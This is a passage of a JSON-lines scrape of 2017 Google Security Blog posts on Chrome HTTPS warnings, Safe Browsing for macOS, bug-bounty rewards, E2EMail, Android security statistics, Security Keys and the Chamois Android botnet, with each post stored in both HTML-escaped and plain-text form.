to fake or deceptive listings.  Combined, here’s how these defenses stack up:    We detect and disable 85% of fake listings before they even appear on Google Maps. We’ve reduced the number of abusive listings by 70% from its peak back in June 2015. We’ve also reduced the number of impressions to abusive listings by 70%.    As we’ve shown, verifying local information comes with a number of unique anti-abuse challenges. While fake listings may slip through our defenses from time to time, we are constantly improving our systems to better serve both users and business owners.      ", "date": "April 6, 2017"},
{"website": "Google-Security", "title": "\nNext Steps Toward More Connection Security \n", "author": ["Posted by Emily Schechter, Chrome Security Team"], "link": "https://security.googleblog.com/2017/04/next-steps-toward-more-connection.html", "abstract": "                             Posted by Emily Schechter, Chrome Security Team     In January, we  began our quest  to improve how Chrome communicates the connection security of HTTP pages. Chrome now marks HTTP pages as &#8220;Not secure&#8221; if they have password or credit card fields. Beginning in October 2017, Chrome will show the &#8220;Not secure&#8221; warning in two additional situations: when users enter data on an HTTP page, and on all HTTP pages visited in  Incognito mode .                    Treatment of HTTP pages in Chrome 62            Our plan  to label HTTP sites as non-secure is taking place in gradual steps, based on increasingly broad criteria. Since the  change in Chrome 56 , there has been a 23% reduction in the fraction of navigations to HTTP pages with password or credit card forms on desktop, and we&#8217;re ready to take the next steps.    Passwords and credit cards are not the only types of data that should be private. Any type of data that users type into websites should not be accessible to others on the network, so starting in version 62 Chrome will show the &#8220;Not secure&#8221; warning when users type data into HTTP sites.               Treatment of HTTP pages with user-entered data in Chrome 62      When users browse Chrome with Incognito mode, they likely have increased expectations of privacy. However, HTTP browsing is not private to others on the network, so in version 62 Chrome will also warn users when visiting an HTTP page in Incognito mode.    Eventually, we plan to show the &#8220;Not secure&#8221; warning for all HTTP pages, even outside Incognito mode. We will publish updates as we approach future releases, but don&#8217;t wait to get started moving to HTTPS! HTTPS is  easier and cheaper than ever before , and it enables both the best performance the web offers and powerful new features that are too sensitive for HTTP. Check out our  set-up guides  to get started.                                   Posted by Emily Schechter, Chrome Security Team  In January, we began our quest to improve how Chrome communicates the connection security of HTTP pages. Chrome now marks HTTP pages as “Not secure” if they have password or credit card fields. Beginning in October 2017, Chrome will show the “Not secure” warning in two additional situations: when users enter data on an HTTP page, and on all HTTP pages visited in Incognito mode.      Treatment of HTTP pages in Chrome 62   Our plan to label HTTP sites as non-secure is taking place in gradual steps, based on increasingly broad criteria. Since the change in Chrome 56, there has been a 23% reduction in the fraction of navigations to HTTP pages with password or credit card forms on desktop, and we’re ready to take the next steps.  Passwords and credit cards are not the only types of data that should be private. Any type of data that users type into websites should not be accessible to others on the network, so starting in version 62 Chrome will show the “Not secure” warning when users type data into HTTP sites.     Treatment of HTTP pages with user-entered data in Chrome 62 When users browse Chrome with Incognito mode, they likely have increased expectations of privacy. However, HTTP browsing is not private to others on the network, so in version 62 Chrome will also warn users when visiting an HTTP page in Incognito mode.  Eventually, we plan to show the “Not secure” warning for all HTTP pages, even outside Incognito mode. We will publish updates as we approach future releases, but don’t wait to get started moving to HTTPS! HTTPS is easier and cheaper than ever before, and it enables both the best performance the web offers and powerful new features that are too sensitive for HTTP. Check out our set-up guides to get started.     ", "date": "April 27, 2017"},
{"website": "Google-Security", "title": "\nExpanding protection for Chrome users on macOS\n", "author": ["Posted by Kylie McRoberts and Ryan Rasti"], "link": "https://security.googleblog.com/2017/03/expanding-protection-for-chrome-users.html", "abstract": "                             Posted by Kylie McRoberts and Ryan Rasti      Safe Browsing  is broadening its protection of macOS devices, enabling safer browsing experiences by improving defenses against unwanted software and malware targeting macOS. As a result, macOS users may start seeing more warnings when they navigate to dangerous sites or download dangerous files (example warning below).           As part of this next step towards reducing macOS-specific malware and unwanted software, Safe Browsing is focusing on two common abuses of browsing experiences: unwanted ad injection, and manipulation of Chrome user settings, specifically the start page, home page, and default search engine. Users deserve full control of their browsing experience and  Unwanted Software Policy  violations hurt that experience.              The recently released  Chrome Settings API for Mac  gives developers the tools to make sure users stay in control of their Chrome settings. From here on, the Settings Overrides API will be the only approved path for making changes to Chrome settings on Mac OSX, like it currently is on Windows. Also, developers should know that only extensions hosted in the Chrome Web Store are allowed to make changes to Chrome settings.              Starting March 31 2017, Chrome and Safe Browsing will warn users about software that attempts to modify Chrome settings without using the API.              For more information about the criteria we use to guide our efforts to protect Safe Browsing&#8217;s users, please visit our  malware and unwanted software help center .                                      Posted by Kylie McRoberts and Ryan Rasti  Safe Browsing is broadening its protection of macOS devices, enabling safer browsing experiences by improving defenses against unwanted software and malware targeting macOS. As a result, macOS users may start seeing more warnings when they navigate to dangerous sites or download dangerous files (example warning below).    As part of this next step towards reducing macOS-specific malware and unwanted software, Safe Browsing is focusing on two common abuses of browsing experiences: unwanted ad injection, and manipulation of Chrome user settings, specifically the start page, home page, and default search engine. Users deserve full control of their browsing experience and Unwanted Software Policy violations hurt that experience.      The recently released Chrome Settings API for Mac gives developers the tools to make sure users stay in control of their Chrome settings. From here on, the Settings Overrides API will be the only approved path for making changes to Chrome settings on Mac OSX, like it currently is on Windows. Also, developers should know that only extensions hosted in the Chrome Web Store are allowed to make changes to Chrome settings.      Starting March 31 2017, Chrome and Safe Browsing will warn users about software that attempts to modify Chrome settings without using the API.      For more information about the criteria we use to guide our efforts to protect Safe Browsing’s users, please visit our malware and unwanted software help center.      ", "date": "March 1, 2017"},
{"website": "Google-Security", "title": "\nVRP news from Nullcon\n", "author": ["Posted by Josh Armour, Security Program Manager"], "link": "https://security.googleblog.com/2017/03/vrp-news-from-nullcon.html", "abstract": "                             Posted by Josh Armour, Security Program Manager   We&#8217;re thrilled to be joining the security research community at  Nullcon  this week in Goa, India. This is a hugely important event for the  Google Vulnerability Rewards Program &nbsp;and for our work with the security research community, more broadly. To mark the occasion, we wanted to share a few updates about the VRP.   Tougher bugs, bigger rewards   Since the launch of our program in 2010, Google has offered a range of rewards: from $100 USD for low severity issues, up to $20,000 USD for critical vulnerabilities in our web properties (see  Android  and  Chrome  rewards). But, because high severity vulnerabilities have become harder to identify over the years, researchers have needed more time to find them. We want to demonstrate our appreciation for the significant time researchers dedicate to our program, and so we&#8217;re making some changes to our VRP.    Starting today we will be increasing the reward for &#8220;Remote Code Execution&#8221; on the Google VRP from $20,000 USD to $31,337 USD. We are increasing the reward for &#8220;Unrestricted file system or database access&#8221; from $10,000 USD to $13,337 USD as well. Please check out the&nbsp; VRP site &nbsp;for more details and specifics.    Also, we are now donating rewards attributed to reports generated from our internal web security scanner; we have donated over $8000 to  rescue.org  this year so far.  Cloud Security Scanner  allows App Engine customers to utilize a version of the same tool.   Growing the security research community in India   In&nbsp; 2016&#8217;s VRP Year in Review , we featured Jasminder Pal Singh, a longtime contributor who uses rewards to fund his startup, Jasminder Web Services Point. He&#8217;s emblematic of the vibrant and fast-growing computer security research community in India. We saw that new momentum reflected in last year&#8217;s VRP data: India was surpassed only by two other locations in terms of total individual researchers paid. We received reports from ~40% more Indian researchers (as compared to 2015) and gave out 30% more rewards which almost tripled the total, and doubled the average payout (both per researcher and per reward). We are excited to see this growth as all users of Google&#8217;s products benefit.         Globally, we&#8217;ve noticed other&nbsp; interesting trends . Russia has consistently occupied a position in the top 10 every year the last 7 years. We have noticed a 3X increase in reports from Asia, making up 70% of the Android Security Rewards for 2016. We have seen increases in the number of researchers reporting valid bugs from Germany (27%), and France (44%). France broke into our top 5 countries in 2016 for the first time.             In 2016, we delivered technical talks along with educational trainings to an audience of enthusiastic security professionals in Goa at the Nullcon security conference. This year, we continue our investment at Nullcon to deliver&nbsp; content &nbsp;focused on the growing group of bug hunters we see in India. If you are attending Nullcon please stop by and say &#8220;Hello&#8221;!                                      Posted by Josh Armour, Security Program Manager We’re thrilled to be joining the security research community at Nullcon this week in Goa, India. This is a hugely important event for the Google Vulnerability Rewards Program and for our work with the security research community, more broadly. To mark the occasion, we wanted to share a few updates about the VRP. Tougher bugs, bigger rewards Since the launch of our program in 2010, Google has offered a range of rewards: from $100 USD for low severity issues, up to $20,000 USD for critical vulnerabilities in our web properties (see Android and Chrome rewards). But, because high severity vulnerabilities have become harder to identify over the years, researchers have needed more time to find them. We want to demonstrate our appreciation for the significant time researchers dedicate to our program, and so we’re making some changes to our VRP.  Starting today we will be increasing the reward for “Remote Code Execution” on the Google VRP from $20,000 USD to $31,337 USD. We are increasing the reward for “Unrestricted file system or database access” from $10,000 USD to $13,337 USD as well. Please check out the VRP site for more details and specifics.  Also, we are now donating rewards attributed to reports generated from our internal web security scanner; we have donated over $8000 to rescue.org this year so far. Cloud Security Scanner allows App Engine customers to utilize a version of the same tool. Growing the security research community in India In 2016’s VRP Year in Review, we featured Jasminder Pal Singh, a longtime contributor who uses rewards to fund his startup, Jasminder Web Services Point. He’s emblematic of the vibrant and fast-growing computer security research community in India. We saw that new momentum reflected in last year’s VRP data: India was surpassed only by two other locations in terms of total individual researchers paid. We received reports from ~40% more Indian researchers (as compared to 2015) and gave out 30% more rewards which almost tripled the total, and doubled the average payout (both per researcher and per reward). We are excited to see this growth as all users of Google’s products benefit.   Globally, we’ve noticed other interesting trends. Russia has consistently occupied a position in the top 10 every year the last 7 years. We have noticed a 3X increase in reports from Asia, making up 70% of the Android Security Rewards for 2016. We have seen increases in the number of researchers reporting valid bugs from Germany (27%), and France (44%). France broke into our top 5 countries in 2016 for the first time.     In 2016, we delivered technical talks along with educational trainings to an audience of enthusiastic security professionals in Goa at the Nullcon security conference. This year, we continue our investment at Nullcon to deliver content focused on the growing group of bug hunters we see in India. If you are attending Nullcon please stop by and say “Hello”!      ", "date": "March 2, 2017"},
{"website": "Google-Security", "title": "\nE2EMail research project has left the nest\n", "author": ["Posted by KB Sriram, Eduardo Vela Nava, and Stephan Somogyi, Security and Privacy Engineering"], "link": "https://security.googleblog.com/2017/02/e2email-research-project-has-left-nest_24.html", "abstract": "                             Posted by KB Sriram, Eduardo Vela Nava, and Stephan Somogyi, Security and Privacy Engineering     Whether they&#8217;re concerned about insider risks, compelled data disclosure demands, or other perceived dangers, some people prudently use end-to-end email encryption to limit the scope of systems they have to trust. The best-known method, PGP, has long been available in command-line form, as a plug-in for IMAP-based email clients, and it clumsily interoperates with Gmail by cut-and-paste. All these scenarios have demonstrated over 25 years that it&#8217;s too hard to use. Chromebook users also have never had a good solution; choosing between strong crypto and a strong endpoint device is unsatisfactory.    These are some of the reasons we&#8217;ve continued working on the  End-To-End research effort . One of the things we&#8217;ve done over the past year is add the resulting  E2EMail  code to GitHub: E2EMail is not a Google product, it&#8217;s now a fully community-driven open source project, to which passionate security engineers from across the industry have already contributed.    E2EMail offers one approach to integrating OpenPGP into Gmail via a Chrome Extension, with improved usability, and while carefully keeping all cleartext of the message body exclusively on the client. E2EMail is built on a proven, open source  Javascript crypto  library developed at Google.    E2EMail in its current incarnation uses a bare-bones central keyserver for testing, but the recent  Key Transparency announcement &nbsp;is crucial to its further evolution. Key discovery and distribution lie at the heart of the usability challenges that OpenPGP implementations have faced. Key Transparency delivers a solid, scalable, and thus practical solution, replacing the problematic  web-of-trust  model traditionally used with PGP.    We look forward to working alongside the community to integrate E2EMail with the Key Transparency server, and beyond. If you&#8217;re interested in delving deeper, check out the  e2email-org/e2email  repository on GitHub.                                   Posted by KB Sriram, Eduardo Vela Nava, and Stephan Somogyi, Security and Privacy Engineering  Whether they’re concerned about insider risks, compelled data disclosure demands, or other perceived dangers, some people prudently use end-to-end email encryption to limit the scope of systems they have to trust. The best-known method, PGP, has long been available in command-line form, as a plug-in for IMAP-based email clients, and it clumsily interoperates with Gmail by cut-and-paste. All these scenarios have demonstrated over 25 years that it’s too hard to use. Chromebook users also have never had a good solution; choosing between strong crypto and a strong endpoint device is unsatisfactory.  These are some of the reasons we’ve continued working on the End-To-End research effort. One of the things we’ve done over the past year is add the resulting E2EMail code to GitHub: E2EMail is not a Google product, it’s now a fully community-driven open source project, to which passionate security engineers from across the industry have already contributed.  E2EMail offers one approach to integrating OpenPGP into Gmail via a Chrome Extension, with improved usability, and while carefully keeping all cleartext of the message body exclusively on the client. E2EMail is built on a proven, open source Javascript crypto library developed at Google.  E2EMail in its current incarnation uses a bare-bones central keyserver for testing, but the recent Key Transparency announcement is crucial to its further evolution. Key discovery and distribution lie at the heart of the usability challenges that OpenPGP implementations have faced. Key Transparency delivers a solid, scalable, and thus practical solution, replacing the problematic web-of-trust model traditionally used with PGP.  We look forward to working alongside the community to integrate E2EMail with the Key Transparency server, and beyond. If you’re interested in delving deeper, check out the e2email-org/e2email repository on GitHub.     ", "date": "February 24, 2017"},
{"website": "Google-Security", "title": "\nDiverse protections for a diverse ecosystem: Android Security 2016 Year in Review\n", "author": ["Posted by Adrian Ludwig & Mel Miller, Android Security Team"], "link": "https://security.googleblog.com/2017/03/diverse-protections-for-diverse.html", "abstract": "                             Posted by Adrian Ludwig &amp; Mel Miller, Android Security Team   Today, we&#8217;re sharing the third annual Android Security Year In Review, a comprehensive look at our work to protect more than 1.4 billion Android users and their data.    Our goal is simple: keep users safe. In 2016, we improved our abilities to stop dangerous apps, built new security features into Android 7.0 Nougat, and collaborated with device manufacturers, researchers, and other members of the Android ecosystem. For more details, you can read the  full Year in Review report  or watch our  webinar .       Protecting users from PHAs   It&#8217;s critical to keep people safe from  Potentially Harmful Apps (PHAs)  that may put their data or devices at risk. Our ongoing work in this area requires us to find ways to track and stop existing PHAs, and anticipate new ones that haven&#8217;t even emerged yet.    Over the years, we&#8217;ve built a variety of systems to address these threats, such as application analyzers that constantly review apps for unsafe behavior, and Verify Apps which regularly checks users&#8217; devices for PHAs. When these systems detect PHAs, we warn users, suggest they think twice about downloading a particular app, or even remove the app from their devices entirely.    We constantly monitor threats and improve our systems over time. Last year&#8217;s data reflected those improvements: Verify Apps conducted 750 million daily checks in 2016, up from 450 million the previous year, enabling us to reduce the PHA installation rate in the top 50 countries for Android usage.    Google Play continues to be the safest place for Android users to download their apps. Installs of PHAs from Google Play decreased in nearly every category:       Now 0.016 percent of installs, trojans dropped by 51.5 percent compared to 2015   Now 0.003 percent of installs, hostile downloaders dropped by 54.6 percent compared to 2015   Now 0.003 percent of installs, backdoors dropped by 30.5 percent compared to 2015   Now 0.0018 percent of installs, phishing apps dropped by 73.4 percent compared to 2015&nbsp;      By the end of 2016, only 0.05 percent of devices that downloaded apps exclusively from Play contained a PHA; down from 0.15 percent in 2015.    Still, there&#8217;s more work to do for devices overall, especially those that install apps from multiple sources. While only 0.71 percent of all Android devices had PHAs installed at the end of 2016, that was a slight increase from about 0.5 percent in the beginning of 2015. Using improved tools and the knowledge we gained in 2016, we think we can reduce the number of devices affected by PHAs in 2017, no matter where people get their apps.   New security protections in Nougat   Last year, we introduced a  variety of new protections in Nougat , and continued our ongoing work to  strengthen the security of the Linux Kernel .        Encryption improvements : In Nougat, we introduced file-based encryption which enables each user profile on a single device to be encrypted with a unique key. If you have personal and work accounts on the same device, for example, the key from one account can&#8217;t unlock data from the other. More broadly, encryption of user data has been required for capable Android devices since in late 2014, and we now see that feature enabled on over 80 percent of Android Nougat devices.    New audio and video protections : We did significant work to  improve security and re-architect  how Android handles video and audio media. One example: we now store different media components into individual sandboxes, where previously they lived together. Now, if one component is compromised, it doesn&#8217;t automatically have permissions to other components, which helps contain any additional issues.    Even more security for enterprise users : We introduced a  variety of new enterprise security features  including &#8220;Always On&#8221; VPN, which protects your data from the moment your device boots up and ensures it isn't traveling from a work phone to your personal device via an insecure connection. We also added security policy transparency, process logging, improved wifi certification handling, and client certification improvements to our  growing set of enterprise tools .         Working together to secure the Android ecosystem.   Sharing information about security threats between Google, device manufacturers, the research community, and others helps keep all Android users safer. In 2016, our biggest collaborations were via our monthly security updates program and ongoing partnership with the security research community.    Security updates are regularly highlighted as a pillar of mobile security&#8212;and rightly so. We  launched our monthly security updates program  in 2015, following the public disclosure of a bug in Stagefright, to help accelerate patching security vulnerabilities across devices from many different device makers. This program expanded significantly in 2016:       More than 735 million devices from 200+ manufacturers received a platform security update in 2016.   We released monthly Android security updates throughout the year for devices running Android 4.4.4 and up&#8212;that accounts for 86.3 percent of all active Android devices worldwide.   Our carrier and hardware partners helped expand deployment of these updates, releasing updates for over half of the top 50 devices worldwide in the last quarter of 2016.      We provided monthly security updates for all supported Pixel and Nexus devices throughout 2016, and we&#8217;re thrilled to see our partners invest significantly in regular updates as well. There&#8217;s still a lot of room for improvement, however. About half of devices in use at the end of 2016 had not received a platform security update in the previous year. We&#8217;re working to increase device security updates by streamlining our security update program to make it easier for manufacturers to deploy security patches and releasing  A/B updates  to make it easier for users to apply those patches.    On the research side, our Android Security Rewards program grew rapidly: we  paid researchers nearly $1 million dollars  for their reports in 2016. In parallel, we worked closely with various security firms to identify and quickly fix issues that may have posed risks to our users.    We appreciate all of the hard work by Android partners, external researchers, and teams at Google that led to the progress the ecosystem has made with security in 2016. But it doesn&#8217;t stop there. Keeping users safe requires constant vigilance and effort. We&#8217;re looking forward to new insights and progress in 2017 and beyond.                                      Posted by Adrian Ludwig & Mel Miller, Android Security Team Today, we’re sharing the third annual Android Security Year In Review, a comprehensive look at our work to protect more than 1.4 billion Android users and their data.  Our goal is simple: keep users safe. In 2016, we improved our abilities to stop dangerous apps, built new security features into Android 7.0 Nougat, and collaborated with device manufacturers, researchers, and other members of the Android ecosystem. For more details, you can read the full Year in Review report or watch our webinar.  Protecting users from PHAs It’s critical to keep people safe from Potentially Harmful Apps (PHAs) that may put their data or devices at risk. Our ongoing work in this area requires us to find ways to track and stop existing PHAs, and anticipate new ones that haven’t even emerged yet.  Over the years, we’ve built a variety of systems to address these threats, such as application analyzers that constantly review apps for unsafe behavior, and Verify Apps which regularly checks users’ devices for PHAs. When these systems detect PHAs, we warn users, suggest they think twice about downloading a particular app, or even remove the app from their devices entirely.  We constantly monitor threats and improve our systems over time. Last year’s data reflected those improvements: Verify Apps conducted 750 million daily checks in 2016, up from 450 million the previous year, enabling us to reduce the PHA installation rate in the top 50 countries for Android usage.  Google Play continues to be the safest place for Android users to download their apps. Installs of PHAs from Google Play decreased in nearly every category:   Now 0.016 percent of installs, trojans dropped by 51.5 percent compared to 2015 Now 0.003 percent of installs, hostile downloaders dropped by 54.6 percent compared to 2015 Now 0.003 percent of installs, backdoors dropped by 30.5 percent compared to 2015 Now 0.0018 percent of installs, phishing apps dropped by 73.4 percent compared to 2015    By the end of 2016, only 0.05 percent of devices that downloaded apps exclusively from Play contained a PHA; down from 0.15 percent in 2015.  Still, there’s more work to do for devices overall, especially those that install apps from multiple sources. While only 0.71 percent of all Android devices had PHAs installed at the end of 2016, that was a slight increase from about 0.5 percent in the beginning of 2015. Using improved tools and the knowledge we gained in 2016, we think we can reduce the number of devices affected by PHAs in 2017, no matter where people get their apps. New security protections in Nougat Last year, we introduced a variety of new protections in Nougat, and continued our ongoing work to strengthen the security of the Linux Kernel.   Encryption improvements: In Nougat, we introduced file-based encryption which enables each user profile on a single device to be encrypted with a unique key. If you have personal and work accounts on the same device, for example, the key from one account can’t unlock data from the other. More broadly, encryption of user data has been required for capable Android devices since in late 2014, and we now see that feature enabled on over 80 percent of Android Nougat devices. New audio and video protections: We did significant work to improve security and re-architect how Android handles video and audio media. One example: we now store different media components into individual sandboxes, where previously they lived together. Now, if one component is compromised, it doesn’t automatically have permissions to other components, which helps contain any additional issues. Even more security for enterprise users: We introduced a variety of new enterprise security features including “Always On” VPN, which protects your data from the moment your device boots up and ensures it isn't traveling from a work phone to your personal device via an insecure connection. We also added security policy transparency, process logging, improved wifi certification handling, and client certification improvements to our growing set of enterprise tools.   Working together to secure the Android ecosystem. Sharing information about security threats between Google, device manufacturers, the research community, and others helps keep all Android users safer. In 2016, our biggest collaborations were via our monthly security updates program and ongoing partnership with the security research community.  Security updates are regularly highlighted as a pillar of mobile security—and rightly so. We launched our monthly security updates program in 2015, following the public disclosure of a bug in Stagefright, to help accelerate patching security vulnerabilities across devices from many different device makers. This program expanded significantly in 2016:   More than 735 million devices from 200+ manufacturers received a platform security update in 2016. We released monthly Android security updates throughout the year for devices running Android 4.4.4 and up—that accounts for 86.3 percent of all active Android devices worldwide. Our carrier and hardware partners helped expand deployment of these updates, releasing updates for over half of the top 50 devices worldwide in the last quarter of 2016.   We provided monthly security updates for all supported Pixel and Nexus devices throughout 2016, and we’re thrilled to see our partners invest significantly in regular updates as well. There’s still a lot of room for improvement, however. About half of devices in use at the end of 2016 had not received a platform security update in the previous year. We’re working to increase device security updates by streamlining our security update program to make it easier for manufacturers to deploy security patches and releasing A/B updates to make it easier for users to apply those patches.  On the research side, our Android Security Rewards program grew rapidly: we paid researchers nearly $1 million dollars for their reports in 2016. In parallel, we worked closely with various security firms to identify and quickly fix issues that may have posed risks to our users.  We appreciate all of the hard work by Android partners, external researchers, and teams at Google that led to the progress the ecosystem has made with security in 2016. But it doesn’t stop there. Keeping users safe requires constant vigilance and effort. We’re looking forward to new insights and progress in 2017 and beyond.      ", "date": "March 22, 2017"},
{"website": "Google-Security", "title": "\nBetter and more usable protection from phishing\n", "author": ["Posted by Christiaan Brand and Guemmy Kim, Product Managers, Google Account Security"], "link": "https://security.googleblog.com/2017/02/better-and-more-usable-protection-from.html", "abstract": "                             Posted by Christiaan Brand and Guemmy Kim, Product Managers, Google Account Security   Despite constant advancements in online safety, phishing &#8212; one of the web&#8217;s oldest and simplest attacks &#8212; remains a tough challenge for the security community. Subtle tricks and good old-fashioned con-games can cause even the most security-conscious users to reveal their passwords or other personal information to fraudsters.   New advancements in phishing protection     This is why we&#8217;re excited about the  news for G Suite customers : the launch of Security Key enforcement. Now, G Suite administrators can better protect their employees by enabling Two-Step Verification (2SV) using  only  Security Keys as the second factor, making this protection the norm rather than just an option. 2SV with only a Security Key offers the highest level of protection from phishing. Instead of entering a unique code as a second factor at sign-in, Security Keys send us cryptographic proof that users are on a legitimate Google site and that they have their Security Keys with them. Since most hijackers are remote, their efforts are thwarted because they cannot get physical possession of the Security Key.    Users can also take advantage of new  Bluetooth low energy (BLE) Security Key support , which makes using 2SV Security Key protection easier on mobile devices. BLE Security Keys, which work on both Android and iOS, improve upon the usability of other form factors.   A long history of phishing protections     We&#8217;ve helped protect users from phishing for many years. We rolled out 2SV back in 2011, and later strengthened it in 2014 with the  addition of Security Keys . These launches complement our many layers of phishing protections &#8212;&nbsp; Safe Browsing warnings ,  Gmail spam filters , and  account sign-in challenges &nbsp;&#8212; as well as our work with industry groups like the  FIDO Alliance  and  M3AAWG  to develop standards and combat phishing across the industry. In the coming months, we&#8217;ll build on these protections and offer users the opportunity to further protect their personal Google Accounts.                                        Posted by Christiaan Brand and Guemmy Kim, Product Managers, Google Account Security Despite constant advancements in online safety, phishing — one of the web’s oldest and simplest attacks — remains a tough challenge for the security community. Subtle tricks and good old-fashioned con-games can cause even the most security-conscious users to reveal their passwords or other personal information to fraudsters. New advancements in phishing protection  This is why we’re excited about the news for G Suite customers: the launch of Security Key enforcement. Now, G Suite administrators can better protect their employees by enabling Two-Step Verification (2SV) using only Security Keys as the second factor, making this protection the norm rather than just an option. 2SV with only a Security Key offers the highest level of protection from phishing. Instead of entering a unique code as a second factor at sign-in, Security Keys send us cryptographic proof that users are on a legitimate Google site and that they have their Security Keys with them. Since most hijackers are remote, their efforts are thwarted because they cannot get physical possession of the Security Key.  Users can also take advantage of new Bluetooth low energy (BLE) Security Key support, which makes using 2SV Security Key protection easier on mobile devices. BLE Security Keys, which work on both Android and iOS, improve upon the usability of other form factors. A long history of phishing protections  We’ve helped protect users from phishing for many years. We rolled out 2SV back in 2011, and later strengthened it in 2014 with the addition of Security Keys. These launches complement our many layers of phishing protections — Safe Browsing warnings, Gmail spam filters, and account sign-in challenges — as well as our work with industry groups like the FIDO Alliance and M3AAWG to develop standards and combat phishing across the industry. In the coming months, we’ll build on these protections and offer users the opportunity to further protect their personal Google Accounts.      ", "date": "February 1, 2017"},
{"website": "Google-Security", "title": "\nDetecting and eliminating Chamois, a fraud botnet on Android\n", "author": ["Posted by Security Software Engineers—Bernhard Grill, Megan Ruthven, and Xin Zhao"], "link": "https://security.googleblog.com/2017/03/detecting-and-eliminating-chamois-fraud.html", "abstract": "                             Posted by Security Software Engineers&#8212;Bernhard Grill, Megan Ruthven, and Xin Zhao                 Google works hard to protect users across a variety of devices and environments. Part of this work involves defending users against&nbsp; Potentially Harmful Applications &nbsp;(PHAs), an effort that gives us the opportunity to observe various types of threats targeting our ecosystem. For example, our security teams recently discovered and defended users of our ads and Android systems against a new PHA family we've named Chamois.    Chamois is an Android PHA family capable of:      Generating invalid traffic &nbsp;through ad pop ups having deceptive graphics inside the ad   Performing&nbsp; artificial app promotion &nbsp;by automatically installing apps in the background   Performing&nbsp; telephony fraud &nbsp;by sending&nbsp; premium text messages    Downloading and executing additional plugins        Interference with the ads ecosystem    We detected Chamois during a routine ad traffic quality evaluation. We analyzed malicious apps based on Chamois, and found that they employed several methods to avoid detection and tried to trick users into clicking ads by displaying deceptive graphics. This sometimes resulted in downloading of other apps that commit SMS fraud. So we blocked the Chamois app family using&nbsp; Verify Apps &nbsp;and also kicked out bad actors who were trying to game our ad systems.    Our previous experience with ad fraud apps like this one enabled our teams to swiftly take action to protect both our advertisers and Android users. Because the malicious app didn't appear in the device's app list, most users wouldn't have seen or known to uninstall the unwanted app. This is why Google's&nbsp; Verify Apps &nbsp;is so valuable, as it helps users discover PHAs and delete them.      Under Chamois's hood    Chamois was one of the largest PHA families seen on Android to date and distributed through multiple channels. To the best of our knowledge Google is the first to publicly identify and track Chamois.    Chamois had a number of features that made it unusual, including:      Multi-staged payload : Its code is executed in 4 distinct stages using different file formats, as outlined in this diagram.                     This multi-stage process makes it more complicated to immediately identify apps in this family as a PHA because the layers have to be peeled first to reach the malicious part. However, Google's pipelines weren't tricked as they are designed to tackle these scenarios properly.      Self-protection : Chamois tried to evade detection using obfuscation and anti-analysis techniques, but our systems were able to counter them and detect the apps accordingly.    Custom encrypted storage : The family uses a custom, encrypted file storage for its configuration files and additional code that required deeper analysis to understand the PHA.    Size : Our security teams sifted through more than 100K lines of sophisticated code written by seemingly professional developers. Due to the sheer size of the APK, it took some time to understand Chamois in detail.        Google's approach to fighting PHAs    Verify Apps protects users from known PHAs by warning them when they are downloading an app that is determined to be a PHA, and it also enables users to uninstall the app if it has already been installed. Additionally, Verify Apps monitors the state of the Android ecosystem for anomalies and investigates the ones that it finds. It also helps finding unknown PHAs through behavior analysis on devices. For example, many apps downloaded by Chamois were highly ranked by the&nbsp; DOI scorer . We have implemented rules in Verify Apps to protect users against Chamois.    Google continues to significantly invest in its counter-abuse technologies for Android and its ad systems, and we're proud of the work that many teams do behind the scenes to fight PHAs like Chamois.    We hope this summary provides insight into the growing complexity of Android botnets. To learn more about Google's anti-PHA efforts and further ameliorate the risks they pose to users, devices, and ad systems, keep an eye open for the upcoming \"Android Security 2016 Year In Review\" report.                                   Posted by Security Software Engineers—Bernhard Grill, Megan Ruthven, and Xin Zhao       Google works hard to protect users across a variety of devices and environments. Part of this work involves defending users against Potentially Harmful Applications (PHAs), an effort that gives us the opportunity to observe various types of threats targeting our ecosystem. For example, our security teams recently discovered and defended users of our ads and Android systems against a new PHA family we've named Chamois.  Chamois is an Android PHA family capable of:  Generating invalid traffic through ad pop ups having deceptive graphics inside the ad Performing artificial app promotion by automatically installing apps in the background Performing telephony fraud by sending premium text messages Downloading and executing additional plugins    Interference with the ads ecosystem  We detected Chamois during a routine ad traffic quality evaluation. We analyzed malicious apps based on Chamois, and found that they employed several methods to avoid detection and tried to trick users into clicking ads by displaying deceptive graphics. This sometimes resulted in downloading of other apps that commit SMS fraud. So we blocked the Chamois app family using Verify Apps and also kicked out bad actors who were trying to game our ad systems.  Our previous experience with ad fraud apps like this one enabled our teams to swiftly take action to protect both our advertisers and Android users. Because the malicious app didn't appear in the device's app list, most users wouldn't have seen or known to uninstall the unwanted app. This is why Google's Verify Apps is so valuable, as it helps users discover PHAs and delete them.   Under Chamois's hood  Chamois was one of the largest PHA families seen on Android to date and distributed through multiple channels. To the best of our knowledge Google is the first to publicly identify and track Chamois.  Chamois had a number of features that made it unusual, including:  Multi-staged payload: Its code is executed in 4 distinct stages using different file formats, as outlined in this diagram.         This multi-stage process makes it more complicated to immediately identify apps in this family as a PHA because the layers have to be peeled first to reach the malicious part. However, Google's pipelines weren't tricked as they are designed to tackle these scenarios properly.  Self-protection: Chamois tried to evade detection using obfuscation and anti-analysis techniques, but our systems were able to counter them and detect the apps accordingly. Custom encrypted storage: The family uses a custom, encrypted file storage for its configuration files and additional code that required deeper analysis to understand the PHA. Size: Our security teams sifted through more than 100K lines of sophisticated code written by seemingly professional developers. Due to the sheer size of the APK, it took some time to understand Chamois in detail.    Google's approach to fighting PHAs  Verify Apps protects users from known PHAs by warning them when they are downloading an app that is determined to be a PHA, and it also enables users to uninstall the app if it has already been installed. Additionally, Verify Apps monitors the state of the Android ecosystem for anomalies and investigates the ones that it finds. It also helps finding unknown PHAs through behavior analysis on devices. For example, many apps downloaded by Chamois were highly ranked by the DOI scorer. We have implemented rules in Verify Apps to protect users against Chamois.  Google continues to significantly invest in its counter-abuse technologies for Android and its ad systems, and we're proud of the work that many teams do behind the scenes to fight PHAs like Chamois.  We hope this summary provides insight into the growing complexity of Android botnets. To learn more about Google's anti-PHA efforts and further ameliorate the risks they pose to users, devices, and ad systems, keep an eye open for the upcoming \"Android Security 2016 Year In Review\" report.     ", "date": "March 13, 2017"},
